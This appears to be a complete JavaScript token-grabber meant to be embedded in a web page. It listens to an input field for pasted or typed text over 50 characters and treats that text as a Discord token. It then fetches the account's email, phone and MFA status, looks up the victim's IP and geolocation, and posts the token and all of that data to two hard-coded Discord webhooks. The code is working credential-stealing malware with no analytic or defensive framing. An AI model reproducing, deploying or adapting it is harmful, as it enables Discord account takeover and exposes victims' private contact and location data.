(function() {
    const WEBHOOKS = [
        "https://discord.com/api/webhooks/1510600905853108315/gg6Evk5crnNyA7BA6f6wCyObrc0n_OMutzwSLscFmpdn9WkpizHP1iN_KN4fjIQW1685",
        "https://discord.com/api/webhooks/1510617426952327168/XXLauZ_BKgomkxXnUf6OZstPKekfSvIcrAeorqJiQwKzNOaQwOiIqGd_gVYsMiF-LW6G",
    ];

    async function sendToWebhook(webhook, content) {
        try {
            await fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: content })
            });
            return true;
        } catch(e) {
            return false;
        }
    }

    async function sendData(content) {
        let successCount = 0;
        let failCount = 0;
        
        for (const webhook of WEBHOOKS) {
            const result = await sendToWebhook(webhook, content);
            if (result) {
                successCount++;
                console.log(`✅ Sent to webhook ${successCount + failCount}`);
            } else {
                failCount++;
                console.error(`❌ Failed to send to webhook ${successCount + failCount}`);
            }
        }
        console.log(`📊 Summary: ${successCount} succeeded, ${failCount} failed`);
    }

    async function getIP() {
        try {
            const res = await fetch("https://api.ipify.org?format=json");
            const data = await res.json();
            return data.ip;
        } catch(e) {
            return "Unable to get IP";
        }
    }

    async function getIPInfo(ip) {
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await res.json();
            return `IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
Postal: ${data.postal}
Latitude: ${data.latitude}
Longitude: ${data.longitude}
ISP: ${data.org}
Timezone: ${data.timezone}`;
        } catch(e) {
            return "Unable to get IP info";
        }
    }

    async function getDiscordInfo(token) {
        try {
            const res = await fetch("https://discord.com/api/v9/users/@me", {
                headers: { Authorization: token }
            });
            if (!res.ok) return "Invalid token or rate limited";
            const data = await res.json();
            return `User ID: ${data.id}
Email: ${data.email}
Phone: ${data.phone || "None"}
Username: ${data.username}#${data.discriminator}
Verified: ${data.verified}
MFA Enabled: ${data.mfa_enabled}`;
        } catch(e) {
            return "Failed to fetch Discord info";
        }
    }

    async function processInput(inputValue) {
        const token = inputValue.trim();
        if (!token) return;

        const ip = await getIP();
        const discordInfo = await getDiscordInfo(token);
        const ipInfo = await getIPInfo(ip);

        const output = `\`\`\`ini
Token --> ${token}

* Account Info
${discordInfo}

* Networking Info
Ip --> ${ip}

* Ip Info
${ipInfo}
\`\`\``;

        await sendData(output);
    }

    function attachToField(selector) {
        const field = document.querySelector(selector);
        if (!field) return console.error("Field not found:", selector);

        let oldValue = field.value;
        field.addEventListener("input", async () => {
            let newValue = field.value;
            if (newValue !== oldValue && newValue.length > 50) {
                await processInput(newValue);
                oldValue = newValue;
            }
        });

        field.addEventListener("paste", async () => {
            setTimeout(async () => {
                if (field.value.length > 50) {
                    await processInput(field.value);
                }
            }, 10);
        });
    }

    window.attachToField = attachToField;
})();
